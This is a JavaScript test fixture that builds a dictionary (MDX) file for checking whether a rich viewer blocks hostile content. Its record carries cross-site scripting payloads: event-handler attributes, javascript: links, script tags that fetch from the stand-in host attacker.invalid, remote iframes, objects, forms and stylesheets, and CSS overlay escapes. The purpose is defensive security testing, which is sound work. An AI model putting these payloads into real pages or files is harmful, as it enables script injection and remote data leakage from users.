import { makeRichMdx } from "./rich-mdict-fixture.mjs";

const nestedFontStress = "<span style=\"font-size:300%;\">".repeat(30) +
  "bounded font stress" + "</span>".repeat(30);

const hostileRecord = `
<div id="richviewer-outside-proof" onclick="window.__richViewerExecuted = 'event'" style="position:fixed;inset:0;z-index:2147483647;background-image:url(https://attacker.invalid/escape.png)">
  <p><b>Safe dictionary hierarchy</b><br><i>ordinary italic detail</i></p>
  ${nestedFontStress}
  <ul><li>First meaning</li><li>Second meaning</li></ul>
  <table><tr><th>Part</th><th>Meaning</th></tr><tr><td>n.</td><td>安全文本</td></tr></table>
  <ruby>漢<rt>kanji</rt></ruby>
  <a href="https://attacker.invalid/navigate">Remote navigation text</a>
  <a href="javascript:window.__richViewerExecuted='navigation'">Script navigation text</a>
  <img src="https://attacker.invalid/remote.png" alt="remote image placeholder" onerror="window.__richViewerExecuted='image'">
  <img src="images/local-picture.png" alt="本地图片" onload="window.__richViewerExecuted='local-image'">
  <audio controls src="https://attacker.invalid/remote.mp3" title="remote audio placeholder"></audio>
  <audio src="audio/local-pronunciation.mp3" title="本地发音"></audio>
  <script>window.__richViewerExecuted = 'script'; fetch('https://attacker.invalid/script-fetch')</script>
  <script src="https://attacker.invalid/remote.js"></script>
  <iframe src="https://attacker.invalid/frame"></iframe>
  <object data="https://attacker.invalid/object"></object>
  <embed src="https://attacker.invalid/embed">
  <form action="https://attacker.invalid/submit"><input autofocus onfocus="window.__richViewerExecuted='form'"></form>
  <link rel="stylesheet" href="https://attacker.invalid/remote.css">
  <style>@import url("https://attacker.invalid/import.css"); body { background: rgb(255, 0, 0) !important; } #richviewer-outside-proof { color: rgb(255, 0, 0) !important; position: fixed !important; }</style>
</div>`;

const compactRecord = "`1`COMPACT HEADWORD`2``2``3`[pronunciation] `4`compact note`2``5`CSS marker remains readable text`2``6`escaped layout marker`2`";

const styleSheet = [
  "1", '<b style="font-size:180%;">', "</b>",
  "2", "</br>", "",
  "3", "<font color=dodgerblue>", "</font>",
  "4", "<font color=gray>", "</font>",
  "5", '<span style="background-image:url(https://attacker.invalid/compact.png);">', "</span>",
  "6", '<span style="position:fixed;inset:0;z-index:2147483647;">', "</span>"
].join("\n");

/** Build a compact MDX v2 fixture with active content, remote loads and CSS escape attempts. */
export function makeRichViewerSecurityFixture() {
  return makeRichMdx([
    ["run", hostileRecord],
    ["richviewercompactterm", compactRecord]
  ], {
    title: "Rich Viewer Security Fixture",
    encrypted: 2,
    compact: "Yes",
    compat: "Yes",
    styleSheet
  });
}

export const richViewerSecurityFixtureExpectations = Object.freeze({
  hostileQuery: "run",
  compactQuery: "richviewercompactterm",
  localImageText: "本地图片",
  localAudioText: "本地发音",
  safeMeaning: "安全文本",
  remoteHost: "attacker.invalid"
});
